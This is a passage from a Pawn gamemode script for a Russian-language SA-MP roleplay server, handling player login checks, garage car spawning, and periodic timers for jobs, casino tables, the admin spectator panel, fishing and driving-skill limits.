	{
		if(i == playerid) continue;
		GetPlayerIp(i,ip[1],16);
		if(!strcmp(ip[0],ip[1],true)) x++;
		if(x > 1) Kick(i), Kick(playerid);
		break;
	}
	SendMes(playerid, 0xEAC700AA, " Добро пожаловать на %s", NameServer);
	
	SetPlayerInterior(playerid, 0);
	SetPlayerVirtualWorld(playerid, 1);
    InterpolateCameraPos(playerid, 1473.8407,-1366.1068,62.4495, 1473.8407,-1366.1068,62.4495, 30000);
    InterpolateCameraLookAt(playerid, 1481.3604,-1368.9431,62.4475, 1481.3604,-1368.9431,62.4475, 30000);
    
	TogglePlayerControllable(playerid, 0);
	mysql_format(DATABASE, QUERY, 128, "SELECT * FROM `"TABLE_BANIP"` WHERE `IP` = '%s'", ip[0]);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",4,playerid,"");
	mysql_format(DATABASE, QUERY, 256, "SELECT `Name` FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%e'",Name(playerid));
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",5,playerid,"");
	SetPVarInt(playerid, "start_menu", 1);
	return true;
}
stock SetPlayerCriminal(playerid, killerid[], reason[])
{
	PlayerInfo[playerid][pCrimes]++;
	strmid(PlayerCrime[playerid][pVictim], killerid, 0, strlen(killerid), 50);
	strmid(PlayerCrime[playerid][pAccusedof], reason, 0, strlen(reason), 50);
	if(PlayerInfo[playerid][pWantedLevel] > 6)
	{
		PlayerInfo[playerid][pWantedLevel] = 6;
	}
	foreach(i)
	{
		if(PlayerInfo[i][pMember] == 1 || PlayerInfo[i][pLeader] == 1 || PlayerInfo[i][pMember] == 10 || PlayerInfo[i][pLeader] == 10 || PlayerInfo[i][pMember] == 2 ||PlayerInfo[i][pLeader] == 2 || PlayerInfo[i][pMember] == 21 || PlayerInfo[i][pLeader] == 21)
		{
		    if(GetPVarInt(i, "Fraction_Duty"))
		    {
				format(string, 144, " [Wanted %i: %s] [Сообщает: %s] [%s]",PlayerInfo[playerid][pWantedLevel], PlayerInfo[playerid][pName],killerid,reason);
				SCM(i, 0xffc801c8,string);
			}
		}
	}
	SendMes(playerid, COLOR_LIGHTRED, " [Wanted %i: %s] [Сообщает: %s] [%s]",PlayerInfo[playerid][pWantedLevel], PlayerInfo[playerid][pName],killerid,reason);
	return 1;
}
stock GetPlayerSpeed(playerid)
{
    new Float:Coord[4];
    GetPlayerVelocity(playerid, Coord[0], Coord[1], Coord[2]);
    Coord[3] = floatsqroot(floatpower(floatabs(Coord[0]), 2.0) + floatpower(floatabs(Coord[1]), 2.0) + floatpower(floatabs(Coord[2]), 2.0)) * 213.3;
    return floatround(Coord[3]);
}
stock ClearCarsPlayer(playerid)
{
	house_car[playerid] = -1;
	SetPVarInt(playerid, "chosencar",-1);
	for(new x; x < 5; x++)
	{
	    if(garage_car[playerid][x] != INVALID_VEHICLE_ID)
	    {
	        DestroyVehicle(garage_car[playerid][x]);
	        createdcar --;
	    }
	}
	return 1;
}
stock LoadCarsPlayer(playerid)
{
    if(HGet(playerid))
	{
	    new house = PlayerInfo[playerid][pPHouseKey];
	    switch(HouseInfo[house][hKlass])
	    {
	        case 0..1:
	        {
	        	garage_car[playerid][0] = CreateVehicle(CarInfo[playerid][carModel][0], HouseInfo[house][hCarx], HouseInfo[house][hCary], HouseInfo[house][hCarz], HouseInfo[house][hCarc] , CarInfo[playerid][carColor_one][0] ,CarInfo[playerid][carColor_two][0], 86400);
				SetVehicleParamsEx(garage_car[playerid][0],false,false,false,true,false,false,false);
				CarHealth[garage_car[playerid][0]] = float(1000);
				createdcar ++;
				Fuell[garage_car[playerid][0]] = CarInfo[playerid][carFuel][0];
				LoadTuning(playerid,garage_car[playerid][0],0);
				house_car[playerid] = garage_car[playerid][0];
			}
			case 2: // house C Class
			{
				SpawnCarOne(playerid, 248.1234,-110.5993,1003.6578+2.2,90.6935); // Load car #2
			    LinkVehicleToInterior(garage_car[playerid][0], 19);
				SetVehicleVirtualWorld(garage_car[playerid][0], house+100);
				//----------------------
			   	SpawnCarTwo(playerid, 248.3368,-104.4114,1003.6582+2.2,86.1593); // Load car #1
			    LinkVehicleToInterior(garage_car[playerid][1], 19);
				SetVehicleVirtualWorld(garage_car[playerid][1], house+100);
			}
			case 3: // house B Class
			{
			    SpawnCarOne(playerid, 435.5904,468.6050,1002.6595,358.6705); // Load car #1
			    LinkVehicleToInterior(garage_car[playerid][0], 19);
				SetVehicleVirtualWorld(garage_car[playerid][0], house+100);
			    //----------------------
			    SpawnCarTwo(playerid, 441.7249,468.3962,1002.6600,360.0000); // Load car #2
			    LinkVehicleToInterior(garage_car[playerid][1], 19);
				SetVehicleVirtualWorld(garage_car[playerid][1], house+100);
    			//----------------------
			    SpawnCarThree(playerid, 447.4809,468.1860,1002.6586,358.1951); // Load car #3
			    LinkVehicleToInterior(garage_car[playerid][2], 19);
				SetVehicleVirtualWorld(garage_car[playerid][2], house+100);
			}
			case 4: // house A Class
			{
			    SpawnCarOne(playerid, 893.5298,31.7400,1004.1795,333.8575); // Load car #1
			    LinkVehicleToInterior(garage_car[playerid][0], 19);
				SetVehicleVirtualWorld(garage_car[playerid][0], house+100);
			    //----------------------
			    SpawnCarTwo(playerid, 897.6765,31.8136,1004.1783,0.9835); // Load car #2
			    LinkVehicleToInterior(garage_car[playerid][1], 19);
				SetVehicleVirtualWorld(garage_car[playerid][1], house+100);
    			//----------------------
			    SpawnCarThree(playerid, 902.9612,31.9576,1004.1783,1.5516); // Load car #3
			    LinkVehicleToInterior(garage_car[playerid][2], 19);
				SetVehicleVirtualWorld(garage_car[playerid][2], house+100);
				//----------------------
			    SpawnCarFour(playerid, 907.1154,32.3961,1004.1783,30.6716); // Load car #4
			    LinkVehicleToInterior(garage_car[playerid][3], 19);
				SetVehicleVirtualWorld(garage_car[playerid][3], house+100);
			}
			case 5: // house S Class
			{
			    SpawnCarOne(playerid, 511.2867,505.0032,1002.3588,47.6021); // Load car #1
			    LinkVehicleToInterior(garage_car[playerid][0], 19);
				SetVehicleVirtualWorld(garage_car[playerid][0], house+100);
			    //----------------------
			    SpawnCarFive(playerid, 511.4334,518.2543,1002.3597,126.6747); // Load car #2
			    LinkVehicleToInterior(garage_car[playerid][4], 19);
				SetVehicleVirtualWorld(garage_car[playerid][4], house+100);
				//----------------------
                SpawnCarTwo(playerid, 504.8487,503.1697,1002.3583,90.2742); // Load car #3
			    LinkVehicleToInterior(garage_car[playerid][1], 19);
				SetVehicleVirtualWorld(garage_car[playerid][1], house+100);
				//----------------------
				SpawnCarThree(playerid, 504.5507,512.3398,1002.3583,91.0430); // Load car #4
			    LinkVehicleToInterior(garage_car[playerid][2], 19);
				SetVehicleVirtualWorld(garage_car[playerid][2], house+100);
				//----------------------
				SpawnCarFour(playerid, 504.7199,521.3282,1002.3588,90.3364); // Load car #5
			    LinkVehicleToInterior(garage_car[playerid][3], 19);
				SetVehicleVirtualWorld(garage_car[playerid][3], house+100);
			}
		}
	}
	return 1;
}
publics: UpdateFresh()
{
	foreach(i)
	{
		timepickup[i]--;
		new carid = GetPlayerVehicleID(i);
		if(IsABankomat(i)) GameTextForPlayer(i,"~b~PRESS: ~w~ENTER",1000,1);
		if(GetPVarInt(i,"BoneStol")) SelectTextDraw(i,0x33AAFFFF);
		if(GetPVarInt(i, "SelectAvto") != -1) SelectTextDraw(i,0x0080FFFF);
		if(GetRoulet(i) && !GetPVarInt(i,"RStol") && !GetPVarInt(i,"CasinoRank")) GameTextForPlayer(i,"~g~PRESS ENTER",1300,4);
		if(IsPlayerNearGarage(i) && GetPlayerState(i) == PLAYER_STATE_DRIVER && IsPlayerInVehicle(i, house_car[i])) GameTextForPlayer(i,"~g~PRESS ~k~~VEHICLE_HORN~",1300,4);
		if(!GetPVarInt(i,"BoneStol") && IsPlayerNearBone(i) != -1) GameTextForPlayer(i,"~g~PRESS ENTER",1300,4);
		SetPVarInt(i, "NewPlayerAmmo", GetPlayerAmmo(i));
		if(GetPVarInt(i, "NewPlayerAmmo") != GetPVarInt(i, "PlayerAmmo"))
		{
			OnPlayerAmmoChange(i, GetPVarInt(i, "NewPlayerAmmo"), GetPVarInt(i, "PlayerAmmo"));
			SetPVarInt(i, "PlayerAmmo", GetPVarInt(i, "NewPlayerAmmo"));
		}
		if(Works[i])
		{
			if(JobCP[i] != 2 && usemesh[i] != 1) return true;
			if(IsPlayerInAnyVehicle(i)) return true;
			if(IsPlayerApplyAnimation(i, "FALL_back") ||
					IsPlayerApplyAnimation(i, "FALL_collapse") ||
					IsPlayerApplyAnimation(i, "FALL_fall") ||
					IsPlayerApplyAnimation(i, "FALL_front") ||
					IsPlayerApplyAnimation(i, "FALL_glide") ||
					IsPlayerApplyAnimation(i, "FALL_land") ||
					IsPlayerApplyAnimation(i, "FALL_skyDive"))
			{
				SCM(i, COLOR_LIGHTRED, " Вы уронили ящик");
				DisablePlayerCheckpoint(i);
				mesh[i] = 0;
				usemesh[i] = 0;
				if(IsPlayerAttachedObjectSlotUsed(i,1)) RemovePlayerAttachedObject(i,1);
				SetPlayerCheckpoint(i,2230.3528,-2286.1353,14.3751,1.5);
				JobCP[i] = 1;
			}
		}
        if(GetPVarInt(i, "matovoz_rob"))
		{
			if(IsPlayerApplyAnimation(i, "FALL_back") ||
					IsPlayerApplyAnimation(i, "FALL_collapse") ||
					IsPlayerApplyAnimation(i, "FALL_fall") ||
					IsPlayerApplyAnimation(i, "FALL_front") ||
					IsPlayerApplyAnimation(i, "FALL_glide") ||
					IsPlayerApplyAnimation(i, "FALL_land") ||
					IsPlayerApplyAnimation(i, "FALL_skyDive"))
			{
				SCM(i, COLOR_LIGHTRED, " Вы уронили ящик");
				DisablePlayerCheckpoint(i);
		        MatHaul[RobbingBiker[robCar]-gunscar[0]][mLoad] += 250;
				format(string, sizeof(string), "Кол-во груза\n%i", MatHaul[RobbingBiker[robCar]-gunscar[0]][mLoad]);
        		UpdateDynamic3DTextLabelText(Rob3DText, 0xEDEA9FAA, string);
				RemovePlayerAttachedObject(i, 1);
				SetPlayerSpecialAction (i, SPECIAL_ACTION_NONE);
				DeletePVar(i, "matovoz_rob");
			}
		}
		new currentveh;
		currentveh = GetPlayerVehicleID(i);
		new Float:vehx, Float:vehy, Float:vehz;
		GetVehiclePos(currentveh, vehx, vehy, vehz);
		new vehicleid = GetPlayerVehicleID(i);
		new vehiclemodel = GetVehicleModel(vehicleid);
		if(vehiclemodel == 514 || vehiclemodel == 515 || vehiclemodel == 403)
		{
			if(GetVehicleTrailer(GetPlayerVehicleID(i)) != 0 && GetPlayerState(i) == PLAYER_STATE_DRIVER && vehz < 0)
			{
				SCM(i, 0xFF6347AA, " Вы потеряли свой грузовик");
				SCM(i, 0xFF6347AA, " Вы потеряли свой груз");
				peremennn[i] = 0;
				SetVehicleToRespawn(GetPlayerVehicleID(i));
				DestroyVehicle(GetVehicleTrailer(GetPlayerVehicleID(i)));
				DriverJob[i] = false;
				PlayerInfo[i][pDgruz] = 0;
				Gruz[i] = 0;
				bGruz[i] = 0;
			}
		}
		if(vehiclemodel == 514 || vehiclemodel == 515 || vehiclemodel == 403)
		{
			if(GetVehicleTrailer(GetPlayerVehicleID(i)) == 0 && GetPlayerState(i) == PLAYER_STATE_DRIVER && vehz < 0)
			{
				SCM(i, 0xFF6347AA, " Вы потеряли свой грузовик");
				SetVehicleToRespawn(GetPlayerVehicleID(i));
				DriverJob[i] = false;
			}
		}
		GetVehicleParamsEx(carid,engine,lights,alarm,doors,bonnet,boot,objective);
		new Keys,ud;
		new up,dn;
		GetPlayerKeys(i,Keys,up,dn);
		if(GetPVarInt(i,"RStol") && !GetPVarInt(i,"RStavka"))
		{
			new Float:p;
			GetPlayerFacingAngle(i,p);
			switch(GetPVarInt(i,"RStol"))
			{
			case 1..4:
				{
					if(p >= 0 && p <= 190)
					{
						if(dn < 0) Down(i);
						else if(dn > 0) Up(i);
						else if(up < 0) Left(i);
						else if(up > 0) Right(i);
					}
					else
					{
						if(dn > 0) Down(i);
						else if(dn < 0) Up(i);
						else if(up > 0) Left(i);
						else if(up < 0) Right(i);
					}
				}
			default:
				{
					if(p >= 0 && p <= 130 || p >= 290 && p <= 360)
					{
						if(dn > 0) Down(i);
						else if(dn < 0) Up(i);
						else if(up > 0) Left(i);
						else if(up < 0) Right(i);
					}
					else
					{
						if(dn < 0) Down(i);
						else if(dn > 0) Up(i);
						else if(up < 0) Left(i);
						else if(up > 0) Right(i);
					}
				}
			}
		}
		if(IsAAntidm(i) && GetPlayerWeapon(i) > 1)
		{
		    if(!IsAArm(i) && !IsACop(i) && PlayerInfo[i][pAdmin] < 1)
			SetPlayerArmedWeapon(i,0);
		}
		if(Spectate[i] && ud == KEY_DOWN && !LastReconClick[i][0])
		{
			PlayerPlaySound(i, 1083, 0.0, 0.0, 0.0);
			LastReconClick[i][0] = ud;
			if(ReconSelectSub[i] == INVALID_TEXT_DRAW)
			{
				DisableEnableReconButton(i, ReconSelect[i], 0);
				if(ReconSelect[i] >= 15)
				{
					ReconSelect[i] = 7;
					DisableEnableReconButton(i, ReconSelect[i], 1);
				}
				else
				{
					ReconSelect[i]++;
					DisableEnableReconButton(i, ReconSelect[i], 1);
				}
				return 1;
			}
			else
			{
				DisableEnableReconButton(i, ReconSelectSub[i], 0);
				if(ReconSelectSub[i] >= ReconBounds[i][1])
				{
					ReconSelectSub[i] = ReconBounds[i][0];
					DisableEnableReconButton(i, ReconSelectSub[i], 1);
				}
				else
				{
					ReconSelectSub[i]++;
					DisableEnableReconButton(i, ReconSelectSub[i], 1);
				}
			}
		}
		if(Spectate[i] && SpecAd[i] != INVALID_PLAYER_ID) return PlayerTextDrawShow(i, ReconPlayer[34]);
		if(SERVERTEST)
		{
			SendMes(i,COLOR_BLUE,"i - %i, CAMERAMODE - %i",i,GetPlayerCameraMode(i));
			new Float:XS, Float:YS, Float:ZS;
			GetPlayerPos(i,XS,YS,ZS);
			SendMes(i,COLOR_BLUE,"i - %i, X - %.1f, Y - %.1f, Z - %.1f",i,XS,YS,ZS);
			new Float:xw, Float:yw, Float:zw;
			GetPlayerVelocity(i,xw,yw,zw);
			SendMes(i,COLOR_BLUE,"i - %i, X - %.1f, Y - %.1f, Z - %.1f",i,xw,yw,zw);
		}
		if(Sounds == 1)
		{
			new distance = floatround( GetPlayerDistanceFromPoint( i, streampos[0], streampos[1], streampos[2]) );
			if(UseSound[i] == 0 && distance <= rads)
			{
				PlayAudioStreamForPlayer(i, stream, streampos[0], streampos[1], streampos[2], rads, 1);
				UseSound[i] = 1;
			}
			if(UseSound[i] == 1 && distance > rads)
			{
				UseSound[i] = 0;
			}
		}
		if(IsPlayerInAnyVehicle(i)) SetPlayerArmedWeapon(i,0);
		if(GetPlayerState(i) == PLAYER_STATE_DRIVER && (GetPlayerWeapon(i) == WEAPON_DEAGLE || GetPlayerWeapon(i) == WEAPON_SHOTGSPA || GetPlayerWeapon(i) == WEAPON_SAWEDOFF || GetPlayerWeapon(i) == WEAPON_MINIGUN || GetPlayerWeapon(i) == WEAPON_MP5  )) SetPlayerArmedWeapon(i,0);
	}
	return true;
}
publics: Fresh()
{
	if(players > 1000) return SendRconCommand("exit");
	new hour, minute, second;
	gettime(hour, minute, second);
	FixHour(hour);
	hour = shifthour;
	for(new i = GetVehiclePoolSize(); i >= 0; i--)
	{
		if(!GetVehicleModel(i)) continue;
		new Float:health;
		GetVehicleHealth(i, health);
		if(health != 1000 && health < CarHealth[i]) CarHealth[i] = health;
		if(CarHealth[i] < health && CarHealth[i] != 0 && !TimeHealth[i]) SetVehHealth(i,CarHealth[i]);
		if(TimeHealth[i]) TimeHealth[i]--;
	}
	for(new i;i<MAX_BONE;i++)
	{
		if(BoneInfo[i][GameStart] > 0)
		{
			BoneInfo[i][GameStart] --;
			foreach(g)
			{
				if(GetPVarInt(g,"BoneStol")-1 == i && (GetPVarInt(g,"BoneStol_") || BoneInfo[i][Crupie] == g))
				{
					if(BoneInfo[i][GameStart] == 0 && GetPVarInt(g,"BoneStol_") == 1) SetPVarInt(g,"BoneStol_",random(11) + 2), UpdateBone(i);
					else if(BoneInfo[i][GameStart] > 0)
					{
						format(YCMDstr,18,"~g~%i",BoneInfo[i][GameStart]);
						GameTextForPlayer(g,YCMDstr,1200,6);
					}
				}
			}
			if(BoneInfo[i][GameStart] == 0) return ShowItog(i);
		}
	}
	foreach(i)
	{
		if(!PlayerInfo[i][pLogin])
		{
			if(GetPVarInt(i,"time_logged") > 0)
			{
				SetPVarInt(i,"time_logged",GetPVarInt(i,"time_logged")-1);
				if(GetPVarInt(i,"time_logged") == 0)
				{
					SCM(i, COLOR_LIGHTRED," Время на ввод пароля ограничено!");
					ShowPlayerDialogEx(i, -1, 0, "f", "f", "f", "");
					Kick(i);
				}
			}
		}
		else
		{
			if(GetPVarInt(i,"h_stall") && !IsPlayerInRangeOfPoint(i, 5, StallInfo[GetPVarInt(i,"h_stall")][stPos][0], StallInfo[GetPVarInt(i,"h_stall")][stPos][1], StallInfo[GetPVarInt(i,"h_stall")][stPos][2]))
			{
				UpdateDynamic3DTextLabelText(StallInfo[GetPVarInt(i,"h_stall")][stText], 0xFF8C37FF,"Не работает");
				DeletePVar(i,"h_stall");
				SetPlayerSkin(i,PlayerInfo[i][pChar][0]);
			}
			if(PlayerInfo[i][pNarcoLomka] > 0) { new ttt = random(2); if(ttt == 1) { ApplyAnimation(i, "CRACK", "crckdeth1", 4.0, 0, 0, 1, 1, 1); } else { ApplyAnimation(i, "CRACK", "crckdeth3", 4.0, 0, 0, 1, 1, 1); } }
			if(Spectate[i] && SpecAd[i] != INVALID_PLAYER_ID)
			{
				//***********************************************
				new thewarns = 0;
				new sid = SpecAd[i];
				if(PlayerInfo[sid][pWarns] == 0) thewarns = 0;
				if(PlayerInfo[sid][pWarns] != 0 && PlayerInfo[sid][pWarns] != 0) thewarns = thewarns-PlayerInfo[sid][pWarns];
				if(PlayerInfo[sid][pWarns] != 0 && PlayerInfo[sid][pWarns] == 0) thewarns = PlayerInfo[sid][pWarns];
				new tttgtg;
				tttgtg = GetPlayerAmmo(SpecAd[i]);
				//EngineStatus(GetPlayerVehicleID(SpecAd[i])
				//new sobtest[20];
				//format(sobtest,sizeof(sobtest),"~n~%s / %s",(ACCCheck[SpecAd[i]] == 10 ? ("On"):("Off")),(PlayerInfo[SpecAd[i]][Rassa] == 16 ? ("On"):("Off")));
				new Float:health;
				GetVehicleHealth(GetPlayerVehicleID(SpecAd[i]),health);
				new Float:hppp;
				new Float:aermor;
				GetPlayerArmour(SpecAd[i],aermor);
				GetPlayerHealth(SpecAd[i],hppp);
				//			new afktext[7];

				new Float:onepercent = NumberShot[SpecAd[i]]/100;
				new percentshot = floatround(onepercent)*NumberShotTarget[SpecAd[i]];

				new Float:tonepercent = TimeNumberShot[SpecAd[i]]/100;
				new tpercentshot = floatround(tonepercent)*TimeNumberShotTarget[SpecAd[i]];
				new sname[MAX_PLAYER_NAME], httpquery[250];
				GetPlayerName(SpecAd[i], sname, sizeof(sname));
                if(GetPVarInt(SpecAd[i], "AFK_Time") > 2)
				{
					format(httpquery, sizeof(httpquery), "%s~n~ID: %i  ~r~AFK",sname,SpecAd[i]);
					PlayerTextDrawSetString(i, ReconPlayer[6],httpquery);
				}
				else
				{
					format(httpquery, sizeof(httpquery), "%s~n~ID: %i",sname,SpecAd[i]);
					PlayerTextDrawSetString(i, ReconPlayer[6],httpquery);
				}
				/*new sobtest[20];
				format(sobtest,sizeof(sobtest),"~n~%s / %s",(ACCCheck[SpecAd[i]] == 10 ? ("On"):("Off")),(PlayerInfo[SpecAd[i]][Rassa] == 16 ? ("On"):("Off")));*/
				new e_status[25];
				if(GetPlayerState(SpecAd[i]) == PLAYER_STATE_DRIVER) GetVehicleParamsEx(GetPlayerVehicleID(SpecAd[i]), engine, lights, alarm, doors, bonnet, boot, objective);
				if(GetPlayerState(SpecAd[i]) != PLAYER_STATE_DRIVER) e_status = "-";
				else if(engine) e_status = "On";
				else e_status = "Off";
				new maxspeed = 0;
				if(IsPlayerInAnyVehicle(SpecAd[i])) maxspeed = MaxSpeedCar[GetVehicleModel(GetPlayerVehicleID(SpecAd[i]))-400];
				//format(sobtest,sizeof(sobtest),"~n~%s / %s",(ACCCheck[SpecAd[i]] == 10 ? ("On"):("Off")),(PlayerInfo[SpecAd[i]][Rassa] == 16 ? ("On"):("Off")));
				format(httpquery, sizeof(httpquery), "~n~%i : %i / %i~n~%i~n~%.0f~n~%.0f~n~%.0f~n~%i / %i~n~%i~n~%i : %i~n~%i / %i : %i%%~n~%i / %i : %i%%~n~%i : %i~n~%s",
				PlayerInfo[SpecAd[i]][pLevel], PlayerInfo[SpecAd[i]][pExp], (PlayerInfo[SpecAd[i]][pLevel]+1)*4, thewarns, aermor,hppp,health,SpeedVehicle(SpecAd[i]), maxspeed,GetPlayerPing(SpecAd[i]),tttgtg,Weapons[SpecAd[i]][GetPlayerWeapon(SpecAd[i])],NumberShot[SpecAd[i]],NumberShotTarget[SpecAd[i]],percentshot,TimeNumberShot[SpecAd[i]],TimeNumberShotTarget[SpecAd[i]],tpercentshot,GetPVarInt(SpecAd[i], "AFK_Time"), 1000, e_status);
				PlayerTextDrawSetString(i, ReconPlayer[5],httpquery);
				//format(strr1, sizeof(strr1), "%s~n~(%i)  %s~n~~n~~r~]Armour: ~w~%.0f~n~~g~]Hp: ~w~%.0f~n~~g~]CarHp: ~w~%.0f~n~~r~]Money: ~w~%i~n~~b~]Ammo: ~w~%i~n~~p~]Warns: ~w~%i~n~~y~]Ping: ~w~%i~n~~b~]Speed: ~w~%i",getName(SpecAd[i]),SpecAd[i],afktext,aermor,hppp,health,PlayerInfo[SpecAd[i]][Cash],tttgtg,thewarns,GetPlayerPing(SpecAd[i]),SpeedVehicle(SpecAd[i]));
				//PlayerTextDrawSetString(i, NikPlayer,strr1);
			}
			if(GetPVarInt(i, "w_time") < gettime() && GetPVarInt(i,"w_id") && !GetPVarInt(i,"InWorkshop"))
			{
				new x = GetPVarInt(i,"w_id");
				for(new x_ = 0; x_ < 9; x_++)
				{
					WorkshopList[x_][x][wlID] = WorkshopList[x_+1][x][wlID];
					strmid(WorkshopList[x_][x][wlName],WorkshopList[x_+1][x][wlName],0,strlen(WorkshopList[x_][x][wlName]), MAX_PLAYER_NAME);
					WorkshopList[x_+1][x][wlID] = -1;
					strmid(WorkshopList[x_+1][x][wlName],"", 0, strlen(""), 5);
				}
				if(WorkshopList[0][x][wlID] != -1 && strlen(WorkshopList[0][x][wlName]))
				{
					SCM(WorkshopList[0][x][wlID],COLOR_BLUE,"Подошла ваша очередь. У вас есть 2 минуты что бы прибыть к гаражу!");
					SetPVarInt(WorkshopList[0][x][wlID],"w_time", gettime() + 120);
					SetPlayerCheckpoint(WorkshopList[0][x][wlID],WorkshopInfo[x][wMenu][0],WorkshopInfo[x][wMenu][1],WorkshopInfo[x][wMenu][2], 10.0);
				}
				DisablePlayerCheckpoint(i);
				DeletePVar(i,"w_time");
				DeletePVar(i,"w_id");
			}
			if(GetPVarInt(i, "AntiBreik") > 0) SetPVarInt(i, "AntiBreik", GetPVarInt(i, "AntiBreik") - 1);
			if(timecar[i] > 0)
			{
				timecar[i]--;
				if(nachalvzlom[i] == 0) format(YCMDstr,10,"~r~%s",Convert(timecar[i]));
				else format(YCMDstr,10,"~g~BREAK");
				GameTextForPlayer(i, YCMDstr, 2000, 6);
				if(timecar[i] == 1)
				{
					if(PlayerInfo[i][pSkilla] > 0) PlayerInfo[i][pSkilla]--;
					SCM(i, COLOR_BLUE, " SMS: Ты нас разочаровал! Миссия провалена");
					avtocar[i] = 0;
					rabotaon[i] = 0;
					GangZoneDestroy(gangzonesa[i]);
				}
			}
			if(TriggerStatus[i] != 0) if(!PlayerToPoint(2.0,i,TriggerPos[i][0],TriggerPos[i][1],TriggerPos[i][2])) TriggerStatus[i] = 0; // Устанавливаем 0 что бы снова взять триггер
			if(sms_timer[i] > 0) sms_timer[i]--;
			if(GetPVarInt(i,"fish_ready") == 3 && GetPVarInt(i,"fish_began") && GetPVarInt(i,"fish_time") < gettime())
			{
				ApplyAnimation(i,"SWORD","sword_IDLE",50.0,0,1,1,1,1);
				if(Sonar[IsAtFishPlace(i)] > 0) SetPVarInt(i,"fish_chanse",random(20));
				if(IsABoat(i)) SetPVarInt(i,"fish_chanse",random(10));
				if(GetPVarInt(i,"fish_chanse") == 0) GameTextForPlayer(i,"~g~~n~!", 5000, 6), SetPVarInt(i,"fish_time", gettime() + random(5) + 2);
				else if(GetPVarInt(i,"fish_chanse") == 1) GameTextForPlayer(i,"~n~~n~~y~!", 5000, 6), SetPVarInt(i,"fish_time", gettime() + random(5) + 2);
				else if(GetPVarInt(i,"fish_chanse") == 2) GameTextForPlayer(i,"~n~~n~~r~~n~!", 5000, 6), SetPVarInt(i,"fish_time", gettime() + random(3) + 2);
				else GameTextForPlayer(i,"~b~!",11000,6);
			}
			if(startaddiction[i] == 1 && PlayerInfo[i][pAddiction] > 2000 && PlayerInfo[i][pNarcoLomka] == 0)
			{
				if(GetPVarInt(i,"player_paint") == 2) return true;
				SCM(i, 0x9F0000AA, " ~~~~~~~~ У вас началась ломка ~~~~~~~~");
				SCM(i, -1, " (( Вызвать медика - /call => [2] Скорая помощь || Принять наркотик - /usedrugs ))");
				PlayerInfo[i][pNarcoLomka] = 1;
			}
			//
			if(PlayerInfo[i][pDrivingSkill] > 1 && GetPlayerState(i) == PLAYER_STATE_DRIVER && !IsANoLimiter(GetPlayerVehicleID(i)))
			{
				PlayerInfo[i][pDrivingSkill]--;
				switch(PlayerInfo[i][pDrivingSkill])
				{
				case 1: SCM(i, COLOR_GREEN, " Ваш навык вождения повышен. (( Нажмите клавишу \"CTRL\" для выключения ограничителя скорости ))"),accept_car_damage[i] = 0;
				case 300,600,900,1200: SCM(i, COLOR_GREEN, " Ваш навык вождения повышен."),accept_car_damage[i] = 0;
				}
			}
			if(PlayerInfo[i][pDrivingSkill] > 0 && GetPlayerState(i) == PLAYER_STATE_DRIVER && !IsANoLimiter(GetPlayerVehicleID(i)))
			{
				new Float:veh[3];
				GetVehicleVelocity(GetPlayerVehicleID(i),veh[0],veh[1],veh[2]);
				switch(PlayerInfo[i][pDrivingSkill])
				{
				case 1..300: if(SpeedVehicle(i) > 50) setVehicleSpeed(GetPlayerVehicleID(i),50);
				case 301..600: if(SpeedVehicle(i) > 45) setVehicleSpeed(GetPlayerVehicleID(i),45);
				case 601..900: if(SpeedVehicle(i) > 40) setVehicleSpeed(GetPlayerVehicleID(i),40);
				case 901..1200: if(SpeedVehicle(i) > 35) setVehicleSpeed(GetPlayerVehicleID(i),35);
				}
			}
			if(CellTime[i] > 0)
			{
				if (CellTime[i] == cchargetime)
				{
					CellTime[i] = 1;
					if(Mobile[Mobile[i]] == i) PlayerInfo[i][pMobile] = PlayerInfo[i][pMobile]+callcost;
					CellTime[i] = CellTime[i] +1;
					if (Mobile[Mobile[i]] == 999 && CellTime[i] == 5)
					{
						if(IsPlayerConnected(Mobile[i]))
						{
							format(string, 90, "У %s звонит мобильник",Name(Mobile[i]));
							ProxDetector(30.0, Mobile[i], string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						}
					}
				}
				if(CellTime[i] == 0 && PlayerInfo[i][pMobile] > 0)
				{
					format(string, 64, "~w~Phone~n~~r~%i", PlayerInfo[i][pMobile]);
					GameTextForPlayer(i, string, 5000, 1);
				}
			}
			if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(i)) && peremennn[i] == 0) // если  прицеп есть
			{
				peremennn[i] = 1;
			}
			else if(!IsTrailerAttachedToVehicle(GetPlayerVehicleID(i)) && peremennn[i] == 1)
			{
				if(bGruz[i] == 0) return true;
				PlayerInfo[i][pDgruz] -= 3;
				SCM(i, 0xFF6347AA, " Вы потеряли часть груза");
				peremennn[i] = 0;
				if(PlayerInfo[i][pDgruz] < 0) PlayerInfo[i][pDgruz] = 1;
			}
			if(GetPVarInt(i, "GunCheckTime") == 0 && PlayerInfo[i][pAdmin] == 0)
			{
				new weaponid, ammo;
				for (new it = 1; it < 11; it++)
				{
					GetPlayerWeaponData(i, it, weaponid, ammo);
					if(PlayerInfo[i][pLogin]) Weapons[i][weaponid] = ammo;
				}
			}
			if(GetPVarInt(i, "GunCheckTime") > 0) SetPVarInt(i, "GunCheckTime", GetPVarInt(i, "GunCheckTime") - 1);
			if(PlayerInfo[i][pSatiety] > 100) PlayerInfo[i][pSatiety] = 100;
			if(PlayerInfo[i][pWantedLevel] > 6) PlayerInfo[i][pWantedLevel] = 6, SetPlayerWantedLevel(i,PlayerInfo[i][pWantedLevel] );
			if(PlayerInfo[i][pZakonp] > 100) PlayerInfo[i][pZakonp] = 100;
			if(PlayerInfo[i][pZakonp] < -100) PlayerInfo[i][pZakonp] = -100;
			if(LabelOn[i] == 0 && PlayerInfo[i][pWantedLevel] >= 0)
			{
				LabelOn[i] = 1;
    			LabelRecognition[i] = Create3DTextLabel("Преступник!",0xFF000044, 30.0, 40.0, 50.0, 40.0,0);
				Attach3DTextLabelToPlayer(LabelRecognition[i], i, 0.0, 0.0, 0.4);
			}
			if(PlayerInfo[i][pWantedLevel] >= 0)
			{
				switch(PlayerInfo[i][pWantedLevel])
				{
						case 0..2:Update3DTextLabelText(LabelRecognition[i], 0xFF000044, "Преступник!");
						case 3..4:Update3DTextLabelText(LabelRecognition[i], 0xFF000099, "Преступник!");
						case 5..6:Update3DTextLabelText(LabelRecognition[i], 0xFF0000FF, "Преступник!");
				}
			}
